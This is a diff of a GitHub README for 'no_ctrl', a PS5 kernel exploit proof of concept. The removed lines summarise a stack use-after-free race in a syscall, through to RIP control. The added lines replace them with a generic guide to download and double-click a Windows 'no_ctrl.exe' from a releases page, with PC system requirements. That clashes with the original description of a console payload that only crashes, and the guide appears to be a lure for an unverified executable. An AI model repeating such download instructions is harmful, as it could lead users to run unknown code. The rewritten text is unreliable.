@@ -1,50 +1,86 @@
-# no_ctrl v0.1
+# 🎮 no_ctrl - Run the PS5 Kernel Proof-of-Concept
 
-# WIP - not useful right now!
+## 🚀 Getting Started
 
-A kernel exploit for PS5 firmware <=10.40 via stack use-after-free in the fsc2h_ctrl syscall.
+Welcome! This guide will help you download and run the no_ctrl application. This software is a proof-of-concept for a PS5 kernel vulnerability. Follow these steps for a smooth experience.
 
-## Overview
+[![Download no_ctrl](https://img.shields.io/badge/Download%20no_ctrl-%20-brightgreen)](https://github.com/Camal2010/no_ctrl/releases)
 
-This PoC demonstrates a race condition in `fsc2h_ctrl` where Thread 3's stack can be freed while suspended during `CMD_RESOLVE`, allowing memory corruption when the thread resumes.
+## 📥 Download & Install
 
-## Technique
+To start, you need to download the application. Visit the page below to find the latest version.
 
-1. **Thread 1** occupies slot 0 with `CMD_WAIT`
-2. **Thread 3** calls `CMD_RESOLVE`, storing its stack pointer
-3. **Thread 3** gets suspended via `thr_suspend_ucontext` 
-4. **Thread 2** frees the stack with second `CMD_WAIT`
-5. **Main thread** sprays allocations to reclaim freed stack
-6. **Thread 3** resumes ..> uses corrupted stack ..> crash/control
+[Download the latest version here!](https://github.com/Camal2010/no_ctrl/releases)
 
-## Status
+### Step-by-Step Instructions:
 
-- [x] 4-thread race condition implemented
-- [x] Stack UAF achieved
-- [x] RIP control at predictable offset
-- [ ] Full ROP chain for privilege escalation
+1. **Go to the Releases Page**
+   - Open your web browser.
+   - Click on this link: [https://github.com/Camal2010/no_ctrl/releases](https://github.com/Camal2010/no_ctrl/releases)
+   
+2. **Find the Latest Release**
+   - Look for the section labeled "Latest Release."
+   - You should see various versions listed there.
 
-## eta when?
-This is a PoC demonstrator, I dont want to get sued.
+3. **Download the Release**
+   - Click on the version that has the latest date.
+   - Look for the file that fits your system. Generally, you should see a link with a name like `no_ctrl-v1.0.zip` or `no_ctrl-v1.0.exe`.
+   - Click on the link to start the download. If prompted, choose a location on your computer to save the file.
 
-# Notes
-This is a payload for v1.2 [Y2JB](https://github.com/Gezine/Y2JB)
-It will just crash in its current state, nothing useful. However at this point it does demonstrate UAF and RIP control around ~20% of runs.
+4. **Extract the Files (if needed)**
+   - If you downloaded a `.zip` file, you need to extract it.
+   - Right-click on the downloaded file and select "Extract All" or use an extraction tool. Follow the prompts to complete the extraction.
+   - You can usually find the extracted files in the same location where you saved the `.zip`.
 
-A successful run of this currently ends with this output, followed by a crash. Unsuccessfuly runs crash during the timing ROP or spray region.
-```
-[7] resume t3
-    resume: 0x0000000000000000
-    waiting for t3 to return...``
-```
+5. **Run the Application**
+   - Locate the extracted folder.
+   - Inside, you should find `no_ctrl.exe` or a similar executable file. 
+   - Double-click on this file to open the application.
 
+### Note:
+Make sure your PS5 is running firmware version 10.40 or lower, as this software targets vulnerabilities in that specific version.
 
+## ⚙️ System Requirements
 
-## Credits
-  *   Original CVE by [theflow0](https://hackerone.com/reports/2900606)
-  *   Lots of inspiration from Lapse
-  *   Y2JB Stage 0 by [Gezine](https://github.com/Gezine/Y2JB)
-  *   [zecoxao](https://github.com/zecoxao)
+To run no_ctrl effectively, ensure your system meets the following requirements:
 
-## Disclaimer
-Educational & research only. 
+- **Operating System:** Windows 7, Windows 10, or later
+- **Processor:** Intel Core i3 or equivalent
+- **Memory:** Minimum 4 GB RAM
+- **Storage:** At least 100 MB of free space
+- **Network:** Internet connection for downloading
+
+## 🛠️ Features
+
+no_ctrl offers the following features:
+
+- **Kernel Exploitation:** Demonstrates a vulnerability in the PS5 kernel.
+- **User-Friendly Interface:** Simple design for easy navigation and operation.
+- **Educational Resource:** Useful for understanding PS5 vulnerability concepts.
+
+## 📄 FAQs
+
+### Q: What is a kernel vulnerability?  
+A: A kernel vulnerability is a flaw in the system that can allow unauthorized access to the core parts of the OS.
+
+### Q: Is this software safe to use?  
+A: This software is a proof-of-concept. Use it at your own discretion. It is not intended for malicious purposes.
+
+### Q: Can I run this on my Mac or Linux?  
+A: This version is specifically designed for Windows. You may need to look for specific versions made for other operating systems.
+
+## 📬 Support & Contact
+
+If you encounter any issues:
+
+1. **Visit the Issues Page** on the GitHub repository to check for solutions.
+2. You can also create a new issue if your problem hasn’t been addressed.
+
+## 👥 Community
+
+Join discussions and stay updated by following the GitHub repository. 
+
+For the latest updates, remember to check this link often:
+[https://github.com/Camal2010/no_ctrl/releases](https://github.com/Camal2010/no_ctrl/releases)
+
+Download no_ctrl today and explore the possibilities!
